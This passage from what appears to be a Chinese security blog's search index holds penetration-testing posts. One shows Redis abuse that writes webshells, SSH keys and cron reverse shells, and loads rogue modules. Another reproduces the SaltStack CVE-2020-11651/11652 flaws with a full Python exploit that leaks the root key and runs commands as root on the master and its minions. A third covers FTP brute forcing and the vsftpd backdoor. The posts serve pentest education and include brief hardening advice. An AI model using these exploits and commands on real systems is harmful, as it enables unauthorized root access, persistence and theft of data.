在渗透测试中常见的利用方式","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/","tags":["Redis","渗透测试"],"title":"Redis 在渗透测试中常见的利用方式","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"Redis 在渗透测试中常见的利用方式 本文主要以 redis 未授权或已知 redis 口令为前提进行漏洞利用 ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:0:0","tags":["Redis","渗透测试"],"title":"Redis 在渗透测试中常见的利用方式","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"1 写入 webshell 条件： 已知 web 目录绝对路径 拥有该目录下的可写权限 查看所有键，创建新键，键值为 webshell，这里以写入 phpinfo 进行一个演示。 因为创建新键赋键值会把原来的键值覆盖，所以需要在赋值的时候需要查看所有的键，然后选择一个没有的键创建赋值。 keys * set x \"\\n\\n\u003c?php pnpinfo();?\u003e\\n\" get x 查看 redis 数据库配置信息，因为我们写 Webshell 会修改 dir 和 dbfilename，所以这里查看配置信息主要记下原来的值，好在写入后修改回来。 config get * 设置 webshell 输出目录和文件名，然后写入 Webshell。 config set dir /var/www # 设置文件写入目录 config set dbfilename 1.php # 设置写入文件名 save # 保存 最后，再还原数据库配置。 ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:1:0","tags":["Redis","渗透测试"],"title":"Redis 在渗透测试中常见的利用方式","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"2 写入 ssh 公钥 条件： 已知启动服务的用户 拥有 .ssh 目录 允许使用基于密钥认证的方式登陆 ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:0","tags":["Redis","渗透测试"],"title":"Redis 在渗透测试中常见的利用方式","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"2.1 生成公私钥对 ssh-keygen -t rsa # 生成公钥和私钥 ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:1","tags":["Redis","渗透测试"],"title":"Redis 在渗透测试中常见的利用方式","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"2.2 利用 redis config 写文件 set x \"\\n\\n公钥内容\\n\" config set dir /home/user/.ssh config set dbfilename authorized_keys save ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:2","tags":["Redis","渗透测试"],"title":"Redis 在渗透测试中常见的利用方式","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"2.3 利用公私钥对登录 ssh -i id_rsa user@ip ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:3","tags":["Redis","渗透测试"],"title":"Redis 在渗透测试中常见的利用方式","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"3 写定时任务反弹 shell 条件： 拥有计划任务目录写权限 目标启动计划服务 keys * 查看所有键 set x \"\\n\\n计划任务内容\\n\\n\" config get * config set dir /var/spool/cron config set dbfilename root save 保存，完成文件写入 del x 删除创建的x键 ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:3:0","tags":["Redis","渗透测试"],"title":"Redis 在渗透测试中常见的利用方式","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"4 主从复制 ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:4:0","tags":["Redis","渗透测试"],"title":"Redis 在渗透测试中常见的利用方式","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"4.1 加载扩展模块执行系统命令 具体的原理在之前漏洞复现的文章中已经解释过。 脚本地址：https://github.com/Dliv3/redis-rogue-server 主动连接模式： 参数说明 --rpasswd 如果目标 Redis 服务开启了认证功能，可以通过该选项指定密码 --rhost 目标 redis 服务 IP --rport 目标 redis 服务端口，默认为 6379 --lhost vps 的外网 IP 地址 --lport vps 监控的端口，默认为 21000 python3 redis-rogue-server.py --rhost \u003ctarget address\u003e --rport \u003ctarget port\u003e --lhost \u003cvps address\u003e --lport \u003cvps port\u003e 被动连接模式： 适用于目标Redis服务处于内网的情况 通过 SSRF 攻击 Redis 内网 Redis 未授权访问/已知 Redis 口令，Redis 需要反向连接 redis rogue server python3 redis-rogue-server.py --server-only ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:4:1","tags":["Redis","渗透测试"],"title":"Redis 在渗透测试中常见的利用方式","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"4.2 主从复制写入纯净文件 在 linux 下，可以利用 SYNC 主从同步，来直接写入无杂质的文件，脚本如下： https://github.com/r35tart/RedisWriteFile 此脚本是通过 Redis 主从写出无损文件，可用于 Windows 平台下写出无损的 EXE、DLL、 LNK 和 Linux 下的 SO 等二进制文件 也可以用无杂质覆写 Linux 中的 /etc/shadow python3 RedisWriteFile.py --rhost 172.17.0.2 --rport 6379 --lhost 172.17.0.1 --lport 4444 --rpath \"/var/www\" --rfile \"test.php\" --lfile \"./phpinfo.php\" 上述方法主要是针对 linux，当 windows 上未开启 web 服务时，该如何 getshell？ 下面介绍下 redis 在 windows 下的常见打法： 系统 DLL 劫持 （目标重启或注销） 针对特定软件的 DLL 劫持（目标一次点击） 覆写目标的快捷方式 （目标一次点击） 覆写特定软件的配置文件达到提权目的 （目标无需点击或一次点击） 覆写 sethc.exe 等文件 （攻击方一次触发） 参考：http://r3start.net/index.php/2020/05/25/717 ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:4:2","tags":["Redis","渗透测试"],"title":"Redis 在渗透测试中常见的利用方式","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["渗透测试"],"content":"5 漏洞修复 设置密码认证 尽量以低权限来运行 Redis 服务 限制登录 IP ","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:5:0","tags":["Redis","渗透测试"],"title":"Redis 在渗透测试中常见的利用方式","uri":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["漏洞复现"],"content":"SaltStack 远程命令执行漏洞复现（CVE-2020-11651）","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/","tags":["SaltStack","漏洞复现"],"title":"SaltStack 远程命令执行漏洞复现（CVE-2020-11651）","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["漏洞复现"],"content":"SaltStack 远程命令执行漏洞复现（CVE-2020-11651） ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:0:0","tags":["SaltStack","漏洞复现"],"title":"SaltStack 远程命令执行漏洞复现（CVE-2020-11651）","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["漏洞复现"],"content":"SaltStack 简介 SaltStack 是基于 Python 开发的一套 C/S 架构配置管理工具，是一个服务器基础架构集中化管理平台，具备配置管理、远程执行、监控等功能，基于 Python 语言实现，结合轻量级消息队列（ZeroMQ）与 Python 第三方模块（Pyzmq、PyCrypto、Pyjinjia2、python-msgpack 和 PyYAML 等）构建。 Salt 用于监视和更新服务器状态。每个服务器运行一个称为 minion 的代理程序，该代理程序连接到 master 主机，即 salt 安装程序，该安装程序从 Minions 收集状态报告并发布 Minions 可以对其执行操作的更新消息。通常，此类消息是对所选服务器配置的更新，但是它们也可以用于在多个（甚至所有）受管系统上并行并行运行同一命令。 salt 中的默认通信协议为 ZeroMQ。主服务器公开两个 ZeroMQ 实例，一个称为请求服务器，其中 minion 可以连接到其中报告其状态（或命令输出），另一个称为发布服务器，其中主服务器可以连接和订阅这些消息。 ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:1:0","tags":["SaltStack","漏洞复现"],"title":"SaltStack 远程命令执行漏洞复现（CVE-2020-11651）","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["漏洞复现"],"content":"漏洞详情 ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:2:0","tags":["SaltStack","漏洞复现"],"title":"SaltStack 远程命令执行漏洞复现（CVE-2020-11651）","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["漏洞复现"],"content":"影响版本 SaltStack \u003c 2019.2.4 SaltStack \u003c 3000.2 ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:2:1","tags":["SaltStack","漏洞复现"],"title":"SaltStack 远程命令执行漏洞复现（CVE-2020-11651）","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["漏洞复现"],"content":"漏洞细节 身份验证绕过漏洞（CVE-2020-11651） ClearFuncs 类在处理授权时，并未限制 _send_pub() 方法，该方法直接可以在发布队列消息，发布的消息会通过 root 身份权限进行执行命令。ClearFuncs 还公开了 _prep_auth_info() 方法，通过该方法可以获取到 root key，通过获取到的 root key 可以在主服务上远程调用命令。 目录遍历漏洞（CVE-2020-11652） whell 模块中包含用于在特定目录下读取、写入文件命令。函数中输入的信息与目录进行拼接可以绕过目录限制。 在salt.tokens.localfs 类中的 get_token() 方法（由 ClearFuncs 类可以通过未授权进行调用）无法删除输入的参数，并且作为文件名称使用，在路径中通过拼接 .. 进行读取目标目录之外的文件。唯一的限制是文件必须通过 salt.payload.Serial.loads() 进行反序列化。 ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:2:2","tags":["SaltStack","漏洞复现"],"title":"SaltStack 远程命令执行漏洞复现（CVE-2020-11651）","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["漏洞复现"],"content":"漏洞复现 ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:3:0","tags":["SaltStack","漏洞复现"],"title":"SaltStack 远程命令执行漏洞复现（CVE-2020-11651）","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["漏洞复现"],"content":"nmap 探测端口 nmap -sV -p 4504,4506 IP ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:3:1","tags":["SaltStack","漏洞复现"],"title":"SaltStack 远程命令执行漏洞复现（CVE-2020-11651）","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["漏洞复现"],"content":"exp #!/usr/bin/env python3 import argparse import datetime import os import pip import sys import warnings def install(package): if hasattr(pip, \"main\"): pip.main([\"install\", package]) else: pip._internal.main([\"install\", package]) try: import salt import salt.version import salt.transport.client import salt.exceptions except: install(\"distro\") install(\"salt\") def ping(channel): message = { \"cmd\":\"ping\" } try: response = channel.send(message, timeout=5) if response: return True except salt.exceptions.SaltReqTimeoutError: pass return False def get_rootkey(channel): message = { \"cmd\":\"_prep_auth_info\" } try: response = channel.send(message, timeout=5) for i in response: if isinstance(i,dict) and len(i) == 1: rootkey = list(i.values())[0] return rootkey except: pass return False def minion(channel, command): message = { \"cmd\": \"_send_pub\", \"fun\": \"cmd.run\", \"arg\": [\"/bin/sh -c \\\"{command}\\\"\"], \"tgt\": \"*\", \"ret\": \"\", \"tgt_type\": \"glob\", \"user\": \"root\", \"jid\": \"{0:%Y%m%d%H%M%S%f}\".format(datetime.datetime.utcnow()), \"_stamp\": \"{0:%Y-%m-%dT%H:%M:%S.%f}\".format(datetime.datetime.utcnow()) } try: response = channel.send(message, timeout=5) if response == None: return True except: pass return False def master(channel, key, command): message = { \"key\": key, \"cmd\": \"runner\", \"fun\": \"salt.cmd\", \"kwarg\":{ \"fun\": \"cmd.exec_code\", \"lang\": \"python3\", \"code\": f\"import subprocess;subprocess.call(\\\"{command}\\\",shell=True)\" }, \"user\": \"root\", \"jid\": \"{0:%Y%m%d%H%M%S%f}\".format(datetime.datetime.utcnow()), \"_stamp\": \"{0:%Y-%m-%dT%H:%M:%S.%f}\".format(datetime.datetime.utcnow()) } try: response = channel.send(message, timeout=5) log(\"[ ] Response: \" + str(response)) except: return False def download(channel, key, src, dest): message = { \"key\": key, \"cmd\": \"wheel\", \"fun\": \"file_roots.read\", \"path\": path, \"saltenv\": \"base\", } try: response = channel.send(message, timeout=5) data = response[\"data\"][\"return\"][0][path] with open(dest, \"wb\") as o: o.write(data) return True except: return False def upload(channel, key, src, dest): try: with open(src, \"rb\") as s: data = s.read() except Exception as e: print(f\"[ ] Failed to read {src}: {e}\") return False message = { \"key\": key, \"cmd\": \"wheel\", \"fun\": \"file_roots.write\", \"saltenv\": \"base\", \"data\": data, \"path\": dest, } try: response = channel.send(message, timeout=5) return True except: return False def log(message): if not args.quiet: print(message) if __name__==\"__main__\": warnings.filterwarnings(\"ignore\") desc = \"CVE-2020-11651 PoC\" parser = argparse.ArgumentParser(description=desc) parser.add_argument(\"--host\", \"-t\", dest=\"master_host\", metavar=('HOST'), required=True) parser.add_argument(\"--port\", \"-p\", dest=\"master_port\", metavar=('PORT'), default=\"4506\", required=False) parser.add_argument(\"--execute\", \"-e\", dest=\"command\", default=\"/bin/sh\", help=\"Command to execute. Defaul: /bin/sh\", required=False) parser.add_argument(\"--upload\", \"-u\", dest=\"upload\", nargs=2, metavar=('src', 'dest'), help=\"Upload a file\", required=False) parser.add_argument(\"--download\", \"-d\", dest=\"download\", nargs=2, metavar=('src', 'dest'), help=\"Download a file\", required=False) parser.add_argument(\"--minions\", dest=\"minions\", default=False, action=\"store_true\", help=\"Send command to all minions on master\",required=False) parser.add_argument(\"--quiet\", \"-q\", dest=\"quiet\", default=False, action=\"store_true\", help=\"Enable quiet/silent mode\", required=False) parser.add_argument(\"--fetch-key-only\", dest=\"fetchkeyonly\", default=False, action=\"store_true\", help=\"Only fetch the key\", required=False) args = parser.parse_args() minion_config = { \"transport\": \"zeromq\", \"pki_dir\": \"/tmp\", \"id\": \"root\", \"log_level\": \"debug\", \"master_ip\": args.master_host, \"master_port\": args.master_port, \"auth_timeout\": 5, \"auth_tries\": 1, \"master_uri\": f\"tcp://{args.master_host}:{args.master_port}\" } clear_channel = salt.transport.client.ReqChannel.factory(minion_config, crypt=\"clear\") log(f\"[+] Attempting to ping {args.master_host}\") if not ping(clear_cha","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:3:2","tags":["SaltStack","漏洞复现"],"title":"SaltStack 远程命令执行漏洞复现（CVE-2020-11651）","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["漏洞复现"],"content":"漏洞利用 读取 root key 检测是否存在漏洞: 目录遍历 命令执行 ","date":"2020-05-13","objectID":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/:3:3","tags":["SaltStack","漏洞复现"],"title":"SaltStack 远程命令执行漏洞复现（CVE-2020-11651）","uri":"/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/"},{"categories":["渗透测试"],"content":"常见服务类漏洞","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"常见服务类漏洞 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:0:0","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"FTP 漏洞 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:0","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"FTP 协议介绍 FTP（File Transfer Protocol，文件传输协议）是 TCP/IP 协议组中的协议之一。FTP 协议包括两个组成部分，其一为 FTP 服务器，其二为 FTP 客户端。其中 FTP 服务器用来存储文件，用户可以使用 FTP 客户端通过 FTP 协议访问位于 FTP 服务器上的资源。在开发网站的时候，通常利用 FTP 协议把网页或程序传到 Web 服务器上。此外，由于 FTP 传输效率非常高，在网络上传输大的文件时，一般也采用该协议。 默认情况下 FTP 协议使用 TCP 端口中的 20 和 21 这两个端口，其中 20 用于传输数据，21 用于传输控制信息。但是，是否使用 20 作为传输数据的端口与 FTP 使用的传输模式有关，如果采用主动模式，那么数据传输端口就是 20；如果采用被动模式，则具体最终使用哪个端口要服务器端和客户端协商决定。 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:1","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Banner 信息 Banner 信息暴露远程系统上运行的任何软件或服务的漏洞，因此在安装任何服务后需要隐藏其软件版本。 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:2","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"匿名登录 anonymous login msf scanner/ftp/anonymous 模块 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:3","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"中间人嗅探 攻击者可以利用嗅探工具来帮助他们嗅探网络中服务器和客户端之间传输的数据包并检索凭据，这被称为嗅探，然后将其用于未经授权的访问。如上所述，FTP用户可以使用用于用户名和密码的明文登录协议对自己进行身份验证。 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:4","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"FTP 暴力破解工具 hydra hydra -v -L user.txt -P pass.txt ftp://ip MSF auxiliary/scanner/ftp/ftp_login ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:5","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"vsftpd 笑脸漏洞 版本：vsftp 2.3.4 后门： 用户名中包含 :) 就可以启用绑定在 6200 端口的后门 shell ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:6","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"防御 修改配置上的banner信息 加 ssl 证书(SSL_Enable=YES) 白名单限制登录 iptables 设置登录次数与登录线程 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:1:7","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SSH 漏洞 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:0","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SSH 简介 SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH 最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH 在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX 平台—包括 HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行 SSH。 